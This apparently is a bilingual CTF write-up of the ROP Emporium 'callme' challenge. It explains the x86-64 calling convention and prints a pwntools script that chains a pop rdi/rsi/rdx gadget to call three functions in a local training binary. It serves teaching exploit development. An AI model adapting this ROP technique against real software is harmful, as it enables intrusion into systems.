---
layout: cyber-post
title: "ROP Emporium: callme - Calling functions with arguments in order"
date: 2024-11-20
categories: 
  - writeups
  - stack
tags:
  - rop
  - calling convention
  - gadgets
  - rop emporium
  - stack
  - pwn
  - ctf
excerpt: "Writeup di callme (ROP Emporium): chiamare tre funzioni in sequenza, ciascuna con tre argomenti precisi, usando un gadget pop rdi/rsi/rdx"
---

<div id="star-alert" class="star-alert">
  <div class="star-alert-content">
    <span class="star-icon">⭐</span>
    <span class="star-text lang-it">Ti piace il sito?</span>
    <span class="star-text lang-en">Do you like the site?</span>
    <br>
    <span class="star-text lang-it">Lascia una stella su GitHub!</span>
    <span class="star-text lang-en">Leave a star on GitHub!</span>
    <br>
    <a href="https://github.com/Chris1sFlaggin/Chris1sFlaggin.github.io" target="_blank" class="star-button">
      <span class="lang-it">⭐ Stella</span>
      <span class="lang-en">⭐ Star</span>
    </a>
    <button id="close-star-alert" class="close-button">&times;</button>
  </div>
</div>

<div class="lang-it" markdown="1">
PWN CTF challenge write up. Challenge della serie **ROP Emporium**.

---

# callme

## Il problema

`callme` insegna la **calling convention** System V x86-64. Dobbiamo chiamare, **in quest'ordine**, `callme_one`, `callme_two` e `callme_three`, ognuna con gli stessi tre argomenti:

> `rdi = 0xdeadbeefdeadbeef`, `rsi = 0xcafebabecafebabe`, `rdx = 0xd00df00dd00df00d`

Se l'ordine o gli argomenti non sono esatti, la flag non viene stampata. Ci serve un gadget che carichi tutti e tre i registri:

</div>

<div class="lang-en" markdown="1">
PWN CTF challenge write up. Challenge from the **ROP Emporium** series.

---

# callme

## The problem

`callme` teaches the System V x86-64 **calling convention**. We must call, **in this order**, `callme_one`, `callme_two` and `callme_three`, each with the same three arguments:

> `rdi = 0xdeadbeefdeadbeef`, `rsi = 0xcafebabecafebabe`, `rdx = 0xd00df00dd00df00d`

If the order or the arguments are wrong, no flag. We need a gadget loading all three registers:

</div>

```zsh
0x40093c : pop rdi ; pop rsi ; pop rdx ; ret
```

<div class="lang-it" markdown="1">
## L'exploit

Dopo i `40` byte di padding, la catena è semplicemente: *carica i 3 argomenti → chiama la funzione*, ripetuto tre volte. Ogni chiamata ritorna e prosegue con il gadget successivo. Uso `flat()` di pwntools per costruire il payload agli offset giusti in modo leggibile:

</div>

<div class="lang-en" markdown="1">
## The exploit

After the `40` bytes of padding, the chain is simply: *load the 3 arguments → call the function*, repeated three times. Each call returns and continues with the next gadget. I use pwntools' `flat()` to build the payload at the right offsets, readably:

</div>

```python
from pwn import *

p = process("./callme")
e = ELF("./callme")

uno = p64(0xdeadbeefdeadbeef)
due = p64(0xcafebabecafebabe)
tre = p64(0xd00df00dd00df00d)
pop_args = p64(0x40093c)          # pop rdi ; pop rsi ; pop rdx ; ret

payload = flat({
    40:  pop_args, 48: uno, 56: due, 64: tre,  72:  p64(e.symbols['callme_one']),
    80:  pop_args, 88: uno, 96: due, 104: tre, 112: p64(e.symbols['callme_two']),
    120: pop_args, 128: uno,136: due,144: tre, 152: p64(e.symbols['callme_three']),
})

p.sendline(payload)
p.interactive()
```

<div class="lang-it" markdown="1">
La lezione: in ROP, chiamare una funzione con argomenti è solo "riempire i registri giusti prima del `call` (o del ret verso il simbolo)". Il gadget `pop rdi ; pop rsi ; pop rdx ; ret` è il pane quotidiano di ogni chain a 64 bit.

> 💭 Se hai bisogno di chiarimenti scrivimi pure su discord: *chris1sflaggin*.
</div>

<div class="lang-en" markdown="1">
The lesson: in ROP, calling a function with arguments is just "fill the right registers before the `call` (or the ret into the symbol)". The `pop rdi ; pop rsi ; pop rdx ; ret` gadget is the bread and butter of every 64-bit chain.

> 💭 If you need any clarification, feel free to text me on discord: *chris1sflaggin*.
</div>
